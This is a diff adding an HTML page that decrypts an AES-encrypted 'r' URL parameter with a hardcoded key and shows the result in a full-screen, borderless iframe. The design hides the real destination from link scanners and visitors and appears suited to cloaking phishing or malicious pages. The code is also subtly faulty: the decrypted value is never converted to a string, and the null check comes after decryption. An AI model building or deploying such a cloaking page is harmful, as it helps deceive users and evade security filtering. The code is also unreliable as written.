@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic Iframe</title>
+</head>
+<body>
+
+<script>
+    // Function to get the value of a URL parameter
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    // Get the value of the 'r' parameter
+    var parminiterValue = getParameterByName('r');
+    var decrypted = CryptoJS.AES.decrypt(parminiterValue, "cacti.wtf");
+    var parminiterValue = decrypted
+    // Check if 'r' parameter is present
+    if (parminiterValue !== null) {
+        // Create an iframe element
+        var iframe = document.createElement('iframe');
+        
+        // Set the iframe source to the value of the 'r' parameter
+        iframe.src = parminiterValue;
+
+        // Set iframe styles to take up the entire screen
+        iframe.style.width = '100%';
+        iframe.style.height = '100vh';
+        iframe.style.border = 'none';
+
+        // Append the iframe to the body
+        document.body.appendChild(iframe);
+    } else {
+        // 'r' parameter not found, you can add a fallback or handle it as needed
+        console.log('Parameter ?r= not found in the URL.');
+    }
+</script>
+
+</body>
+</html>
